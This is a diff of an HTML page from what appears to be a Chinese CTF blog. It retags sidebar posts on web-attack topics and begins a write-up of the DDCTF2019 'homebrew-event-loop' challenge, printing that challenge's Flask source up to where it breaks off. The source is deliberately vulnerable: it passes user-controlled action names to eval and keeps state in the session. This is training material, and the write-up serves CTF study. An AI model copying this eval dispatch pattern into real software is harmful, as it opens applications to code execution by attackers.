             <span class="post-title" title="所以你说你懂MD5?">所以你说你懂MD5?</span>
             <span class="post-date" title="2025-03-26 21:36:42">2025/03/26</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/26/ez-php-jail/"
-           data-tag="刷题笔记,命令执行,glob函数"
+           data-tag="命令执行,glob函数"
            data-author="" >
             <span class="post-title" title="ez_php_jail">ez_php_jail</span>
             <span class="post-date" title="2025-03-26 20:21:52">2025/03/26</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/25/WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E1/"
-           data-tag="刷题笔记,php特性,md5,命令执行,intval"
+           data-tag="php特性,md5,命令执行,intval"
            data-author="" >
             <span class="post-title" title="WUSTCTF2020-朴实无华1">WUSTCTF2020-朴实无华1</span>
             <span class="post-date" title="2025-03-25 00:11:56">2025/03/25</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/03/24/ssti-flask-labs/"
-           data-tag="ssti,学习笔记"
+           data-tag="ssti"
            data-author="" >
             <span class="post-title" title="ssti-flask-labs">ssti-flask-labs</span>
             <span class="post-date" title="2025-03-24 19:06:24">2025/03/24</span>
@@ -2204,63 +2251,63 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/21/BUUCTF2018-OnlineTool1/"
-           data-tag="刷题笔记,escapeshellarg()和escapeshellcmd()、单引号逃逸"
+           data-tag="escapeshellarg()和escapeshellcmd()、单引号逃逸"
            data-author="" >
             <span class="post-title" title="BUUCTF2018-OnlineTool1">BUUCTF2018-OnlineTool1</span>
             <span class="post-date" title="2025-03-21 19:50:32">2025/03/21</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"
-           data-tag="刷题笔记,php特性,${phpinfo()}"
+           data-tag="php特性,${phpinfo()}"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-ZJCTF不过如此">BJDCTF2020-ZJCTF不过如此</span>
             <span class="post-date" title="2025-03-21 19:04:56">2025/03/21</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/"
-           data-tag="刷题笔记,php反序列化,命令执行,linux find -name模糊查询文件"
+           data-tag="php反序列化,命令执行,linux find -name模糊查询文件"
            data-author="" >
             <span class="post-title" title="网鼎杯2020朱雀组phpweb1">网鼎杯2020朱雀组phpweb1</span>
             <span class="post-date" title="2025-03-20 23:56:35">2025/03/20</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/20/BSidesCF2020Hadabadday1/"
-           data-tag="刷题笔记,文件包含"
+           data-tag="文件包含"
            data-author="" >
             <span class="post-title" title="BSidesCF2020Hadabadday1">BSidesCF2020Hadabadday1</span>
             <span class="post-date" title="2025-03-20 23:55:26">2025/03/20</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
-           data-tag="刷题笔记,sql注入,ssrf,php反序列化"
+           data-tag="sql注入,ssrf,php反序列化"
            data-author="" >
             <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
             <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/03/19/ctfshow-ssrf/"
-           data-tag="ssrf,学习笔记"
+           data-tag="ssrf"
            data-author="" >
             <span class="post-title" title="ctfshow-ssrf">ctfshow-ssrf</span>
             <span class="post-date" title="2025-03-19 20:05:14">2025/03/19</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/03/19/ctfshow-xxe/"
-           data-tag="xxe,学习笔记"
+           data-tag="xxe"
            data-author="" >
             <span class="post-title" title="ctfshow-xxe">ctfshow-xxe</span>
             <span class="post-date" title="2025-03-19 13:32:30">2025/03/19</span>
@@ -2276,81 +2323,81 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
-           data-tag="php反序列化,学习笔记"
+           data-tag="php反序列化"
            data-author="" >
             <span class="post-title" title="ctfshow-php序列化">ctfshow-php序列化</span>
             <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/14/GXYCTF2019-BabySQli1/"
-           data-tag="刷题笔记,sql注入"
+           data-tag="sql注入"
            data-author="" >
             <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
             <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
-           data-tag="刷题笔记,文件包含,php反序列化"
+           data-tag="文件包含,php反序列化"
            data-author="" >
             <span class="post-title" title="网鼎杯2020青龙组-AreUSerialz1">网鼎杯2020青龙组-AreUSerialz1</span>
             <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
-           data-tag="刷题笔记,文件包含"
+           data-tag="文件包含"
            data-author="" >
             <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
             <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/12/RoarCTF2019-EasyCalc1/"
-           data-tag="刷题笔记,命令执行,waf绕过"
+           data-tag="命令执行,waf绕过"
            data-author="" >
             <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
             <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
-           data-tag="刷题笔记,sql注入,报错注入"
+           data-tag="sql注入,报错注入"
            data-author="" >
             <span class="post-title" title="极客大挑战2019-HardSQL1">极客大挑战2019-HardSQL1</span>
             <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
-           data-tag="刷题笔记,sql注入,堆叠注入"
+           data-tag="sql注入,堆叠注入"
            data-author="" >
             <span class="post-title" title="强网杯2019-随便注1">强网杯2019-随便注1</span>
             <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/03/08/ctfshow-sqli-labs/"
-           data-tag="sql注入,学习笔记"
+           data-tag="sql注入"
            data-author="" >
             <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
             <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
-           data-tag="sql注入,学习笔记"
+           data-tag="sql注入"
            data-author="" >
             <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
             <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
@@ -2366,18 +2413,18 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/"
-           data-tag="php特性,学习笔记"
+           data-tag="php特性"
            data-author="" >
             <span class="post-title" title="ctfshow-php特性">ctfshow-php特性</span>
             <span class="post-date" title="2025-02-24 18:53:16">2025/02/24</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/02/23/ctfshow-xss/"
-           data-tag="xss,学习笔记"
+           data-tag="xss"
            data-author="" >
             <span class="post-title" title="ctfshow-xss">ctfshow-xss</span>
             <span class="post-date" title="2025-02-23 17:12:49">2025/02/23</span>
@@ -2447,7 +2494,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/29/ctfshow-web82/"
            data-tag="文件包含,做题笔记"
            data-author="" >
@@ -2465,7 +2512,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/26/ctfshow-web160/"
            data-tag="文件上传,做题笔记,日志包含"
            data-author="" >
@@ -2474,7 +2521,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
            data-tag="文件上传,做题笔记"
            data-author="" >
@@ -2492,7 +2539,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
            data-tag="刷题笔记,http协议"
            data-author="" >
@@ -2501,7 +2548,7 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
            data-tag="刷题笔记,filter伪协议"
            data-author="" >
@@ -2510,16 +2557,16 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
-           data-tag="刷题笔记,sql注入"
+           data-tag="sql注入,刷题笔记"
            data-author="" >
             <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
             <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
            data-tag="刷题笔记,payload构造"
            data-author="" >
@@ -2528,9 +2575,9 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 刷题笔记 "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
-           data-tag="刷题笔记,sql注入"
+           data-tag="sql注入,刷题笔记"
            data-author="" >
             <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
             <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
@@ -2600,18 +2647,79 @@
 
     </div>
     <div class="hide-list">
-        <div class="semicircle" data-title="切换全屏 快捷键 s">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
             <div class="brackets first"><</div>
             <div class="brackets">&gt;</div>
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-DDCTF2019-homebrew-event-loop" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">对博客的理解</span></a></li></ol>
+        <h1 class="article-title">DDCTF2019-homebrew-event-loop</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="刷题笔记">刷题笔记</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">python代码审计</a>
+            
+            <a class="color1">flask_session伪造</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-05-26 18:24:33'>2025-05-26 16:39</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.9k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DDCTF2019-homebrew-event-loop"><span class="toc-text">DDCTF2019-homebrew-event-loop</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2624,11 +2732,69 @@
     }
 </style>
 </div>
-            <h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p><strong>欢迎来到我博客，啥也没有随便看看吧</strong></p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="DDCTF2019-homebrew-event-loop"><a href="#DDCTF2019-homebrew-event-loop" class="headerlink" title="DDCTF2019-homebrew-event-loop"></a>DDCTF2019-homebrew-event-loop</h1><p>首先打开网页</p>
+<p><img src="/../image/DDCTF2019-homebrew-event-loop-1.png"></p>
+<p>上面显示现在你有0个钻石，3个积分</p>
+<p>然后点击Go to e-shop，看到可以用一个积分买一个钻石。</p>
+<p>点击view source code，可以查看源码，然后python代码审计</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, Response<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*********************&#x27;</span>  <span class="hljs-comment"># censored</span><br>url_prefix = <span class="hljs-string">&#x27;/d5afe1f66147e857&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FLAG</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*********************&#x27;</span>  <span class="hljs-comment"># censored</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trigger_event</span>(<span class="hljs-params">event</span>):<br>    session[<span class="hljs-string">&#x27;log&#x27;</span>].append(event)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(session[<span class="hljs-string">&#x27;log&#x27;</span>]) &gt; <span class="hljs-number">5</span>:<br>        session[<span class="hljs-string">&#x27;log&#x27;</span>] = session[<span class="hljs-string">&#x27;log&#x27;</span>][-<span class="hljs-number">5</span>:]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(event) == <span class="hljs-built_in">type</span>([]):<br>        request.event_queue += event<br>    <span class="hljs-keyword">else</span>:<br>        request.event_queue.append(event)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mid_str</span>(<span class="hljs-params">haystack, prefix, postfix=<span class="hljs-literal">None</span></span>):<br>    haystack = haystack[haystack.find(prefix)+<span class="hljs-built_in">len</span>(prefix):]<br>    <span class="hljs-keyword">if</span> postfix <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        haystack = haystack[:haystack.find(postfix)]<br>    <span class="hljs-keyword">return</span> haystack<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RollBackException</span>:<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_event_loop</span>():<br>    valid_event_chars = <span class="hljs-built_in">set</span>(<br>        <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)<br>    resp = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(request.event_queue) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span><br>        event = request.event_queue[<span class="hljs-number">0</span>]<br>        request.event_queue = request.event_queue[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> event.startswith((<span class="hljs-string">&#x27;action:&#x27;</span>, <span class="hljs-string">&#x27;func:&#x27;</span>)):<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> event:<br>            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> valid_event_chars:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            is_action = event[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;a&#x27;</span><br>            action = get_mid_str(event, <span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>)<br>            args = get_mid_str(event, action+<span class="hljs-string">&#x27;;&#x27;</span>).split(<span class="hljs-string">&#x27;#&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                event_handler = <span class="hljs-built_in">eval</span>(<br>                    action + (<span class="hljs-string">&#x27;_handler&#x27;</span> <span class="hljs-keyword">if</span> is_action <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;_function&#x27;</span>))<br>                ret_val = event_handler(args)<br>            <span class="hljs-keyword">except</span> RollBackException:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = <span class="hljs-string">&#x27;&#x27;</span><br>                resp += <span class="hljs-string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span><br>                resp += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>                session[<span class="hljs-string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="hljs-string">&#x27;num_items&#x27;</span>]<br>                session[<span class="hljs-string">&#x27;points&#x27;</span>] = request.prev_session[<span class="hljs-string">&#x27;points&#x27;</span>]<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">except</span> Exception, e:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = <span class="hljs-string">&#x27;&#x27;</span><br>                <span class="hljs-comment"># resp += str(e) # only for debugging</span><br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">if</span> ret_val <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                    resp = ret_val<br>                <span class="hljs-keyword">else</span>:<br>                    resp += ret_val<br>    <span class="hljs-keyword">if</span> resp <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> resp == <span class="hljs-string">&#x27;&#x27;</span>:<br>        resp = (<span class="hljs-string">&#x27;404 NOT FOUND&#x27;</span>, <span class="hljs-number">404</span>)<br>    session.modified = <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params">url_prefix+<span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">entry_point</span>():<br>    querystring = urllib.unquote(request.query_string)<br>    request.event_queue = []<br>    <span class="hljs-keyword">if</span> querystring == <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">not</span> querystring.startswith(<span class="hljs-string">&#x27;action:&#x27;</span>)) <span class="hljs-keyword">or</span> <span class="hljs-built_in">len</span>(querystring) &gt; <span class="hljs-number">100</span>:<br>        querystring = <span class="hljs-string">&#x27;action:index;False#False&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;num_items&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        session[<span class="hljs-string">&#x27;num_items&#x27;</span>] = <span class="hljs-number">0</span><br>        session[<span class="hljs-string">&#x27;points&#x27;</span>] = <span class="hljs-number">3</span><br>        session[<span class="hljs-string">&#x27;log&#x27;</span>] = []<br>    request.prev_session = <span class="hljs-built_in">dict</span>(session)<br>    trigger_event(querystring)<br>    <span class="hljs-keyword">return</span> execute_event_loop()<br><br><span class="hljs-comment"># handlers/functions below --------------------------------------</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_handler</span>(<span class="hljs-params">args</span>):<br>    page = args[<span class="hljs-number">0</span>]<br>    html = <span class="hljs-string">&#x27;&#x27;</span><br>    html += <span class="hljs-string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.<span class="hljs-built_in">format</span>(<br>        session[<span class="hljs-string">&#x27;num_items&#x27;</span>], session[<span class="hljs-string">&#x27;points&#x27;</span>])<br>    <span class="hljs-keyword">if</span> page == <span class="hljs-string">&#x27;index&#x27;</span>:<br>        html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>        html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>        html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>    <span class="hljs-keyword">elif</span> page == <span class="hljs-string">&#x27;shop&#x27;</span>:<br>        html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>    <span class="hljs-keyword">elif</span> page == <span class="hljs-string">&#x27;reset&#x27;</span>:<br>        <span class="hljs-keyword">del</span> session[<span class="hljs-string">&#x27;num_items&#x27;</span>]<br>        html += <span class="hljs-string">&#x27;Session reset.&lt;br /&gt;&#x27;</span><br>    html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>    <span class="hljs-keyword">return</span> html<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index_handler</span>(<span class="hljs-params">args</span>):<br>    bool_show_source = <span class="hljs-built_in">str</span>(args[<span class="hljs-number">0</span>])<br>    bool_download_source = <span class="hljs-built_in">str</span>(args[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> bool_show_source == <span class="hljs-string">&#x27;True&#x27;</span>:<br><br>        source = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;eventLoop.py&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>        html = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> bool_download_source != <span class="hljs-string">&#x27;True&#x27;</span>:<br>            html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span><br>            html += <span class="hljs-string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span><br><br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> source:<br>            <span class="hljs-keyword">if</span> bool_download_source != <span class="hljs-string">&#x27;True&#x27;</span>:<br>                html += line.replace(<span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;&amp;nbsp;&#x27;</span>*<span class="hljs-number">4</span>).replace(<br>                    <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="hljs-string">&#x27;&lt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&lt;br /&gt;&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                html += line<br>        source.close()<br><br>        <span class="hljs-keyword">if</span> bool_download_source == <span class="hljs-string">&#x27;True&#x27;</span>:<br>            headers = &#123;&#125;<br>            headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;text/plain&#x27;</span><br>            headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=serve.py&#x27;</span><br>            <span class="hljs-keyword">return</span> Response(html, headers=headers)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> html<br>    <span class="hljs-keyword">else</span>:<br>        trigger_event(<span class="hljs-string">&#x27;action:view;index&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy_handler</span>(<span class="hljs-params">args</span>):<br>    num_items = <span class="hljs-built_in">int</span>(args[<span class="hljs-number">0</span>])<br>    <span 